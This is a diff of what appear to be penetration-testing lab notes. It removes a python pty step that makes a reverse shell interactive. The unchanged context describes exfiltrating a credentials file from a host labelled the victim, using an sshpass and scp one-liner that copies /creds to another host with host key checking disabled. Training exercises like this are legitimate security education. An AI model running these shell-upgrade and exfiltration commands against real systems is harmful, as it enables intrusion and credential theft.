@@ -257,12 +257,6 @@ Go back to the first webapp reverse shell and check for an incomming session
 SRV-UB-02 (Victim)
 ==================
 
-Make reverse shell interactive
--------------------------------
-python -c "import pty; pty.spawn('/bin/bash')"
-
-Do NOT use CTLZ-Z this time!
-
 In the reverse shell connection from SRV-UB-02 run the following to exfiltrade the target creds file
 
 cd /tmp
@@ -280,4 +274,3 @@ Oneline command example
 apk add sshpass (requiered to pass password in command)
 
 sshpass -p 'XXXXX' scp -o "StrictHostKeyChecking no" /creds sdr@10.1.1.4:/tmp/creds
-
